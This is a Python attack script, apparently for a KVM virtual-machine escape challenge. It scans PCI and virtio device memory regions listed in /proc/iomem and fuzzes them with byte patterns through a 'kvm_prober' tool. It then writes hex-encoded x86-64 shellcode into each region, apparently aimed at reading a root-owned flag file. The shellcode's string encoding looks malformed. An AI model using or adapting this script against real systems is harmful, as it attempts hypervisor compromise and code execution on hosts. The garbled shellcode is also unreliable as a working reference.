import os
import sys
import subprocess
import random
import time
import binascii
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

OFFSETS_PER_REGION = [0x10, 0x20, 0x40, 0x80, 0x100, 0x200]
FUZZ_LENGTHS = [64, 128, 256, 512, 1024, 2048, 4096]
PATTERNS = [b"\x00" * 128, b"\xff" * 128, b"A" * 128, os.urandom(128)]

LOG_FILE = "payload_write_log.txt"
CHECKPOINT_FILE = "fuzz_checkpoint.txt"
lock = threading.Lock()

shellcode_hex = (
    "4831C05048BF2F726F6F742F7263655F666C6167574889E74831F64831D2B0020F05"
    "4889C74889E64831D2B2FF4831C00F054889C24889E64831FF40B7014831C0B0010F05"
)
shellcode_bytes = binascii.unhexlify(shellcode_hex)


def run_prober(cmd):
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        return b''


def read_mmio(addr, length):
    res = run_prober(['kvm_prober', 'readmmio_buf', f'{addr:x}', f'{length}'])
    try:
        hexline = res.strip().split(b'\n')[0]
        hexstr = b''.join([c for c in hexline if c in b'0123456789abcdefABCDEF'])
        return hexstr
    except Exception:
        return b''


def log_write(label, base, before, after, payload):
    with lock:
        with open(LOG_FILE, "a") as f:
            f.write(f"{label} @ 0x{base:x}\n")
            f.write(f"BEFORE: {before[:128].decode(errors='replace')}\n")
            f.write(f"AFTER: {after[:128].decode(errors='replace')}\n")
            f.write(f"PAYLOAD: {payload[:128]}\n\n")


def save_checkpoint(region, offset):
    with lock:
        with open(CHECKPOINT_FILE, "a") as f:
            f.write(f"{region:x}:{offset:x}\n")


def already_fuzzed(region, offset):
    if not os.path.exists(CHECKPOINT_FILE):
        return False
    with open(CHECKPOINT_FILE, "r") as f:
        for line in f:
            if line.strip() == f"{region:x}:{offset:x}":
                return True
    return False


def fuzz_offset(region, offset):
    base = region + offset
    if already_fuzzed(region, offset):
        return

    for length in FUZZ_LENGTHS:
        for pattern in PATTERNS:
            payload = (pattern * ((length // len(pattern)) + 1))[:length]
            hexstr = binascii.hexlify(payload).decode()
            before = read_mmio(base, length)
            run_prober(['kvm_prober', 'writemmio_buf', f'{base:x}', hexstr])
            after = read_mmio(base, length)
            if before != after:
                log_write("[FUZZED]", base, before, after, hexstr)

    # Spray shellcode
    hexstr = binascii.hexlify(shellcode_bytes).decode()
    before = read_mmio(base, len(shellcode_bytes))
    run_prober(['kvm_prober', 'writemmio_buf', f'{base:x}', hexstr])
    after = read_mmio(base, len(shellcode_bytes))
    if before != after:
        log_write("[SHELLCODE]", base, before, after, hexstr)

    save_checkpoint(region, offset)


def find_pci_bars():
    bars = set()
    with open('/proc/iomem') as f:
        for line in f:
            if re.search(r'virtio|pci', line, re.IGNORECASE):
                m = re.match(r'\s*([0-9a-f]+)-([0-9a-f]+)', line)
                if m:
                    start = int(m.group(1), 16)
                    end = int(m.group(2), 16)
                    bars.add((start, end))
    if not bars:
        bars = {(0xfe800000, 0xfe900000)}  # default fallback
    return list(bars)


def find_active_offsets(region, region_size, step=0x20):
    active = []
    for offset in range(0, region_size, step):
        addr = region + offset
        buf = read_mmio(addr, 64)
        if buf and set(buf) != {ord('0')}:
            active.append(offset)
    return active


def main():
    bars = find_pci_bars()
    print(f"[!] Found {len(bars)} BARs: {bars}")
    jobs = []

    for bar_start, bar_end in bars:
        print(f"[*] Scanning BAR 0x{bar_start:x} - 0x{bar_end:x} for activity...")
        region = bar_start
        region_size = min(bar_end - bar_start, 0x40000)
        active = find_active_offsets(region, region_size)
        print(f"    [+] {len(active)} active offsets found")
        random_offsets = random.sample(range(0, region_size, 0x20), min(20, region_size // 0x100))

        for offset in set(active) | set(random_offsets):
            jobs.append((region, offset))

    with ThreadPoolExecutor(max_workers=8) as pool:
        for region, offset in jobs:
            pool.submit(fuzz_offset, region, offset)

    print("[+] Fuzzing complete. Check logs for results.")


if __name__ == "__main__":
    main()
